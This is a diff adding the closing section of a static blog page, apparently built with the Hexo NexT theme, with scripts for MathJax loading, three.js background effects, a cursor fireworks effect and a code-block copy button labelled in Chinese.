+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    // window.MathJax = {
+    //   loader: {
+    //
+    //       load: ['[tex]/mhchem'],
+    //
+    //     source: {
+    //       '[tex]/amsCd': '[tex]/amscd',
+    //       '[tex]/AMScd': '[tex]/amscd'
+    //     }
+    //   },
+    //   tex: {
+    //     inlineMath: {'[+]': [['$', '$']]},
+    //
+    //       packages: {'[+]': ['mhchem']},
+    //
+    //     tags: 'ams'
+    //   },
+    //   options: {
+    //     renderActions: {
+    //       findScript: [10, doc => {
+    //         document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+    //           const display = !!node.type.match(/; *mode=display/);
+    //           const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+    //           const text = document.createTextNode('');
+    //           node.parentNode.replaceChild(text, node);
+    //           math.start = {node: text, delim: '', n: 0};
+    //           math.end = {node: text, delim: '', n: 0};
+    //           doc.math.push(math);
+    //         });
+    //       }, '', false],
+    //       insertedScript: [200, () => {
+    //         document.querySelectorAll('mjx-container').forEach(node => {
+    //           let target = node.parentNode;
+    //           if (target.nodeName.toLowerCase() === 'li') {
+    //             target.parentNode.classList.add('has-jax');
+    //           }
+    //         });
+    //       }, '', false]
+    //     }
+    //   }
+    // };
+    window.MathJax = {
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+        processEscapes: true
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+    </div>
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+
+</body>
+</html>
